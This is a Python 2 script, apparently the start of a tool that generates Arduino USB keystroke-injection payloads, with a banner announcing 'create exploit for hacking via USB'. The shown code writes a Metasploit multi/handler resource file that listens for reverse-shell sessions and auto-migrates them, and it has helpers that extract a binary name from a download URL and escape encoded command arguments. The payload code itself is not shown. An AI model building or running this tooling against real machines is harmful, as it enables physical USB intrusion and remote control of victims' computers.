#!/usr/bin/python
#uses HID-Project.h from https://github.com/NicoHood/HID, can be installed from Arduino Library Manager

import sys
import argparse
import os
import subprocess
import socket

def bannerMain():

  clearScreen()
  banner = "  ****************************************************************************\n"
  banner += "  *                      d8b        d8                          d8b          *\n"
  banner += "  *                      888        8P8   d8P                    888         *\n"
  banner += "  *                       88b          d888888P                   88b        *\n"
  banner += "  *     d8888b   88bd88b  888888b   88b  888   888   d8P  d888b   888888b    *\n"
  banner += "  *    d8P  888  88P      88P  88b  88P  88P   d88   88  88b      88P  88b   *\n"
  banner += "  *    88b  d88 d88      d88   d88 d88   88b   888  d88     88b  d88   d88   *\n"
  banner += "  *     88888P d88      d888888P  d88     88b   888P 88b 8888P  d888888P     *\n"
  banner += "  *                                                                          *\n"
  banner += "  *                                ORBIT SOLUTIONS                           *\n"
  banner += "  *                              www.orbitsolusi.com                         *\n"
  banner += "  *                                                                          *\n"
  banner += "  ****************************************************************************\n"
  banner += "\n"
  banner += "                     \"CREATE EXPLOIT UNTUK HACKING VIA USB\""
  banner += "\n"
  print banner

def clear():

  os.system('clear')

def clearScreen():

  if sys.platform == "linux" or sys.platform == "linux2" or sys.platform == "darwin":
    clear()
  elif sys.platform == "win32":
    cls()

def cls():
  os.system('cls')
  
def msfRCfile(IP,port,payload, fileName):

  buffer = "use exploit/multi/handler\n"
  buffer += "set PAYLOAD " + payload + "\n"
  buffer += "set LHOST " + IP + "\n"
  buffer += "set LPORT " + port + "\n"
  buffer += "set ExitOnSession false\n"
  buffer += "set autorunscript migrate -f\n"
  buffer += "exploit -j -z\n"

  fileName = checkRC(fileName)
  file = open(fileName,'w')
  file.write(buffer)
  file.close()

  print "\n\nWrote Metasploit file " + fileName 

def checkIP(IPaddress):
  try:
    socket.inet_aton(IPaddress)
    return True
  except socket.error:
    return False

def FileCheck(fileName):
  if os.path.exists(fileName):
    overwrite = raw_input ("File " + fileName+ " already exists. Overwrite? Y/N: ")
    if overwrite not in ('Y','y','yes','Yes','YES'):
      return True
    else:
      return False
  else:
    return False
	
def checkINO(fileName):
  if not fileName.endswith('.ino'):
    fileName = fileName + ".ino"
  return fileName
  
def checkRC(fileName):
  if not fileName.endswith('.rc'):
    fileName = fileName + ".rc"
  return fileName
  
  
def getFileName(defaultFileName):

  fileExists = True
  while fileExists == True:
    fileName = raw_input("Please enter the name of the output file (if left blank the default \""+defaultFileName+"\"): ")
    if fileName == "":
      fileName = defaultFileName
    fileExists = FileCheck(fileName)
    fileName = checkINO(fileName)
  return fileName
  
def getRCFileName(defaultFileName):

  fileExists = True
  while fileExists == True:
    fileName = raw_input("Please enter the name of the Metasploit RC file (if left blank the default \""+defaultFileName+"\"): ")
    if fileName == "":
      fileName = defaultFileName
    fileExists = FileCheck(fileName)
    fileName = checkRC(fileName)
  return fileName

  
def getBinary(URL):
  binary = URL.split("/")[-1]
  return binary
  
def checkQuotes(string):

  if string.startswith('-enc') or string.startswith('-Enc'):
    string = string.replace('"','')
  elif string.startswith('"') and string.endswith('"'):
    string = string.replace('"','\\\"')
  else:
    string = '\\\"' + string + '\\\"'
  return string
  
